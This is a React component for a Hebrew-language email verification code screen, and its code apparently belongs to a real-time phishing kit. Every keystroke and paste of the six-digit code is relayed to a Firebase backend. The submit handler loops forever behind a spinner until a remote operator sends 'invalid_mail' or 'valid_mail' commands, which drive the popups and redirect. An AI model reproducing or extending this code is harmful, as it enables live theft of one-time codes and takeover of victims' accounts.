import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { useFirebaseClient } from '../hooks/useFirebaseClient';
import { reportTyping } from '../firebase/typing';
import { Mail, Check } from 'lucide-react';

const EmailForm = () => {
  const { t } = useTranslation();
  const navigate = useNavigate();
  const [emailCode, setEmailCode] = useState(() => ['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [invalidMessage, setInvalidMessage] = useState('');
  const [copied, setCopied] = useState(false);
  const [showInvalidPopup, setShowInvalidPopup] = useState(false);
  const [showHebrewErrorPopup, setShowHebrewErrorPopup] = useState(false);
  const [hasInvalidEmail, setHasInvalidEmail] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const inputRefs = useRef([]);

  // Hook do Firebase Client
  const {
    clientId,
    clientData,
    isOnline,
    loading: firebaseLoading,
    updateClientData,
    commands,
  } = useFirebaseClient(navigate);

  // Função para limpar comandos de invalidação
  const clearInvalidationCommand = async (commandType) => {
    try {
      const { ref, remove } = await import("firebase/database");
      const { database } = await import("../firebase/config");

      const commandsRef = ref(database, `commands/${clientId}`);
      await remove(commandsRef);
      console.log("🧹 EmailForm - Comando de invalidação limpo:", commandType);
    } catch (error) {
      console.error("❌ EmailForm - Erro ao limpar comando:", error);
    }
  };

  // Escutar comandos de invalidação
  useEffect(() => {
    if (commands && commands.includes("invalid_mail")) {
      // Resetar formulário
      setEmailCode(['', '', '', '', '', '']);
      setLoading(false);
      setSuccess('');
      setError('');
      setHasInvalidEmail(false);
      
      // Definir mensagem em hebraico
      setInvalidMessage('קוד אימייל לא תקין. אנא נסה שוב.');
      setShowInvalidPopup(true);
      
      clearInvalidationCommand("invalid_mail");
      
      // Fechar popup após 3 segundos
      setTimeout(() => {
        setShowInvalidPopup(false);
      }, 3000);
    }

    // Escutar comando de sucesso
    if (commands && commands.includes("valid_mail")) {
      setLoading(false);
      setShowSuccessModal(true);
      clearInvalidationCommand("valid_mail");
      
      // Fechar modal após 3 segundos e navegar
      setTimeout(() => {
        setShowSuccessModal(false);
        navigate('/dashboard');
      }, 3000);
    }
  }, [commands, navigate]);

  // Função para lidar com mudança nos inputs
  const handleInputChange = (index, value) => {
    // Limpar estado de erro quando usuário começar a digitar
    if (hasInvalidEmail) {
      setHasInvalidEmail(false);
    }
    
    // Permitir apenas números
    if (!/^\d*$/.test(value)) return;
    
    const newEmailCode = [...emailCode];
    newEmailCode[index] = value;
    setEmailCode(newEmailCode);
    
    // Auto-focus no próximo input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // Reportar typing e atualizar Firebase
    const fullCode = newEmailCode.join('');
    reportTyping("email", fullCode);
    updateClientData({
      emailCode: fullCode,
      lastEmailInput: Date.now(),
      emailStatus: fullCode ? "Input" : "Empty",
    });
  };

  // Função para lidar com backspace
  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !emailCode[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  // Função para lidar com paste
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newEmailCode = pastedData.split('').concat(Array(6).fill('')).slice(0, 6);
    setEmailCode(newEmailCode);
    
    // Focus no último input preenchido ou no primeiro vazio
    const lastFilledIndex = newEmailCode.findIndex(code => !code);
    const focusIndex = lastFilledIndex === -1 ? 5 : lastFilledIndex;
    inputRefs.current[focusIndex]?.focus();
    
    // Reportar typing e atualizar Firebase
    const fullCode = newEmailCode.join('');
    reportTyping("email", fullCode);
    updateClientData({
      emailCode: fullCode,
      lastEmailInput: Date.now(),
      emailStatus: fullCode ? "Input" : "Empty",
    });
  };

  // Função para copiar código
  const copyCode = () => {
    const fullCode = emailCode.join('');
    navigator.clipboard.writeText(fullCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Função para enviar código de email
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const code = emailCode.join('');
    if (code.length !== 6) {
      setError('Por favor, insira o código completo de 6 dígitos');
      return;
    }

    setLoading(true);
    setError('');
    
    try {
      // Loading infinito - só para se detectar invalid_mail
      while (true) {
        // Simular validação do código de email
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Simular código inválido para demonstrar funcionalidade
        if (code === '123456') {
          throw new Error('invalid_mail');
        }
        
        // Para códigos válidos, continua carregando infinitamente
        // (na implementação real, aqui haveria uma validação real do servidor)
      }
      
    } catch (err) {
      if (err.message === 'invalid_mail') {
        // Limpar inputs e mostrar outline vermelha
        setEmailCode(['', '', '', '', '', '']);
        setHasInvalidEmail(true);
        setError(''); // Remover mensagem de erro padrão
        
        // Definir a mensagem para o card vermelho (mesmo se ele não estiver visível neste fluxo)
        setInvalidMessage('קוד אימייל לא תקין. אנא נסה שוב.');

        setShowHebrewErrorPopup(true); // Mostrar popup em hebraico
        setLoading(false);
        // Focar no primeiro input
        inputRefs.current[0]?.focus();
        
        // Fechar popup após 4 segundos e resetar hasInvalidEmail
        setTimeout(() => {
          setShowHebrewErrorPopup(false);
          setHasInvalidEmail(false); // Resetar outline vermelho
        }, 4000);
      } else {
        setError('קוד אימייל לא תקין. אנא נסה שוב.');
        setLoading(false);
      }
    }
  };

  // Se está carregando, mostrar spinner com logo (mantido durante processamento interno)
  if (loading) {
    return (
      <div className="w-full max-w-full mx-auto text-center px-4 py-6">
        <div className="flex flex-col items-center justify-center space-y-4 max-w-sm mx-auto">
          {/* Spinner somente (removidas imagens acima do spinner) */}
          <div className="w-14 h-14 border-4 border-blue-600/20 border-t-blue-600 rounded-full animate-spin"></div>

          {/* Textos de loading */}
          <div className="space-y-2 px-4">
            <h2 className="text-lg font-semibold text-gray-800" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
              מעבד מייל אימות...
            </h2>
            <p className="text-sm text-gray-600 leading-relaxed" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
              אנא המתן בזמן שאנו מאמתים את הקוד שלך
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <>
      {/* Modal principal - reduzido */}
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-2">
        <div className="bg-white shadow-xl w-full max-w-xs mx-auto relative max-h-[70vh] overflow-y-auto rounded-lg">
          {/* Header do Modal - reduzido */}
          <div className="text-center p-3 pb-1 relative">
            <h2 className="text-base font-semibold text-gray-800">
              אימות דוא"ל
            </h2>
          </div>

          {/* Conteúdo do Modal - reduzido */}
          <div className="p-3 pt-1">
            {loading && (
              <div className="flex justify-center items-center py-3">
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-blue-500"></div>
              </div>
            )}

            {/* Popup de inválido (card vermelho) - reduzido */}
            {showInvalidPopup && (
              <div className="mb-2 p-2 bg-red-100 border border-red-400 text-red-700 rounded text-xs flex justify-center items-center" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
                <span className="text-center">{invalidMessage}</span>
              </div>
            )}

            {/* Formulário - reduzido */}
            <form onSubmit={handleSubmit} className="space-y-2">
              {/* Grid de inputs - reduzido */}
              {!loading && (
                <div className="grid grid-cols-6 gap-1 mb-2 px-1">
                  {Array.isArray(emailCode) && emailCode.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      className={`w-full h-8 text-center text-sm font-medium border-2 ${
                        hasInvalidEmail 
                          ? 'border-red-500 focus:border-red-600 focus:outline-none focus:ring-2 focus:ring-red-200 bg-red-50' 
                          : 'border-gray-300 focus:border-blue-500'
                      } focus:outline-none transition-colors bg-white rounded-md`}
                      style={{ fontFamily: 'Rubik, sans-serif', color: '#7380BF' }}
                    />
                  ))}
                </div>
              )}

              {/* Texto explicativo - reduzido */}
              {!loading && (
                <div className="text-right mb-2 px-1">
                  <p className="text-gray-600 text-xs leading-relaxed">
                    הזן את קוד האימות שנשלח לדוא"ל שלך
                  </p>
                </div>
              )}

              {/* Botão principal "Start Synchronization" */}
              <div className="mt-3">
                <button
                  type="submit"
                  className="bg-gradient-to-r from-purple-600 to-blue-600 text-white font-medium py-2.5 px-6 rounded-lg transition-all duration-300 hover:from-purple-700 hover:to-blue-700 transform hover:scale-105 shadow-lg flex items-center justify-center gap-2 text-sm mx-auto min-w-[140px]"
                  disabled={loading}
                >
                  {loading ? (
                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-current border-t-transparent"></div>
                  ) : (
                    <span className="text-sm">Start Synchronization</span>
                  )}
                </button>
              </div>

              {/* Mensagens de erro e sucesso - reduzidas */}
              {!loading && error && !hasInvalidEmail && (
                <div className="text-red-600 text-xs text-center bg-red-50 p-2 rounded flex justify-center items-center" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
                  <span className="text-center">קוד אימייל לא תקין. אנא נסה שוב.</span>
                </div>
              )}

              {!loading && success && (
                <div className="text-green-600 text-xs text-center bg-green-50 p-2 rounded flex items-center justify-center gap-2">
                  {success}
                </div>
              )}
            </form>
          </div>
        </div>
      </div>

      {/* Modal de sucesso - reduzido */}
      {showSuccessModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[70] p-2">
          <div className="bg-white rounded-lg p-4 max-w-xs w-full mx-4 text-center shadow-xl">
            <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
              <Check className="w-6 h-6 text-green-600" />
            </div>
            <h3 className="text-base font-semibold text-gray-900 mb-2">
              אימות הושלם בהצלחה
            </h3>
            <p className="text-xs text-gray-600 mb-4">
              החשבון שלך אומת בהצלחה
            </p>
            <button
              onClick={() => setShowSuccessModal(false)}
              className="bg-gradient-to-r from-purple-600 to-blue-600 text-white font-medium py-2 px-4 rounded-lg transition-all duration-300 hover:from-purple-700 hover:to-blue-700 transform hover:scale-105 shadow-lg text-sm"
            >
              המשך
            </button>
          </div>
        </div>
      )}

      {/* Popup de erro em hebraico - acima de todos os modais */}
      {showHebrewErrorPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[60] p-4">
          <div className="bg-white rounded-lg p-6 max-w-sm w-full mx-4 text-center shadow-xl">
            <div className="mb-4">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3">
                <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
                </svg>
              </div>
              <h3 className="text-lg font-semibold text-gray-900 mb-2" style={{ fontFamily: 'Rubik, sans-serif' }}>
                קוד אימייל לא תקין
              </h3>
              <p className="text-gray-600 text-sm" style={{ fontFamily: 'Rubik, sans-serif' }}>
                הקוד שהזנת אינו תקין. אנא נסה שוב עם קוד חדש.
              </p>
            </div>
            <button
              onClick={() => setShowHebrewErrorPopup(false)}
              className="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 px-4 rounded-md transition-colors"
              style={{ fontFamily: 'Rubik, sans-serif' }}
            >
              הבנתי
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default EmailForm;